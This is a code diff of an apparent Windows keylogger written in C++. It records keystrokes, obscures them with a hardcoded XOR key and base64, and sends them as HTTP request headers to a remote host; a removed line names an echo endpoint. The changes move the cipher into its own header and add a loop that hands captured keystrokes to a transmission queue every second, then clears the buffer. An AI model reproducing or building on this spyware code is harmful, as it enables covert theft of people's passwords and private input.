@@ -4,8 +4,9 @@
 #include "HTTPRequest.hpp"
 #include <windows.h>
 #include <thread>
-#include <deque>
+#include "datatransmission.h"
 #include <mutex>
+#include "cipher.h"
 
 
 
@@ -17,18 +18,7 @@ std::string recordedKeystrokes = "";
 
 std::mutex recordedKeystrokesMutex;
 
-std::string XOR(std::string message, std::string key)
-{
-    std::string processedMessage = message;
-    int message_length = message.size();
-    int key_length = key.size();
-    for(int i = 0;i<message_length;i++)
-    {
-        processedMessage[i] = message[i]^key[i%key_length];
-    }
 
-    return processedMessage;
-}
 
 
 void addToRecordedKeystrokes(std::string value)
@@ -45,6 +35,11 @@ std::string getRecordedKeystrokes()
     return recordedKeystrokes;
 }
 
+void clearRecordedKeystrokes()
+{
+    std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
+    recordedKeystrokes = "";
+}
 
 
 
@@ -60,7 +55,7 @@ void sendGetRequest(std::string url)
         std::vector<std::pair<std::string, std::string>> headers;
 
         headers.emplace_back(std::pair<std::string,std::string>("imageBase64Encoded","blablub"));
-        headers.emplace_back(std::pair<std::string,std::string>("recordedKeystrokes",base64_encode(XOR(getRecordedKeystrokes(),"ohlongjohnson"))));
+        headers.emplace_back(std::pair<std::string,std::string>("recordedKeystrokes",base64_encode(Cipher::XOR(getRecordedKeystrokes(),"ohlongjohnson"))));
 
         // send a get request
         const auto response = request.send("GET",body,headers);
@@ -74,33 +69,20 @@ void sendGetRequest(std::string url)
 
 }
 
-void sendPostRequest(std::string url)
-{
-    try
-    {
-        http::Request request{url};
-        const std::string body = "foo=1&bar=baz";
 
-        const auto response = request.send("POST", body, {
-                                                             {"Content-Type", "application/x-www-form-urlencoded"}
-                                                         });
-
-        std::string result(response.body.begin(), response.body.end());
-        std::cout << result << '\n';
-    }
-    catch (const std::exception& e)
-    {
-        std::cerr << "Request failed: " << e.what() << '\n';
-    }
-}
-
-void deliveryThread()
+void deliveryThread(DataTransmission &dt)
 {
     for(;;)
     {
-        Sleep(5000);
-        sendGetRequest("http://echo.free.beeceptor.com");
-        //sendPostRequest("http://echo.free.beeceptor.com");
+        Sleep(1000);
+        const std::string s = getRecordedKeystrokes();
+        if(s != "")
+        {
+            dt.Enqueue(s);
+            clearRecordedKeystrokes();
+        }
+
+
     }
 
 }
@@ -351,18 +333,10 @@ int main()
     }
 
 
-    std::string m = "Hast du mal ne Kippe?";
-    std::string k = "geheimnisvolles geheimpasswort";
+    DataTransmission dt = DataTransmission();
 
-    /*std::cout<< "Before Encryption:" << m << std::endl;
-    m = XOR(m,k);
-    std::cout << "After Encryption:" << std::endl;
-    std::cout << m;
-    std::cout << std::endl;
-    m = XOR(m,k);
-    std::cout << "After Decryption:" << m << std::endl;*/
 
-    std::thread b(deliveryThread);
+    std::thread b(deliveryThread,std::ref(dt));
     while (GetMessage(NULL, NULL, 0, 0));
 
 
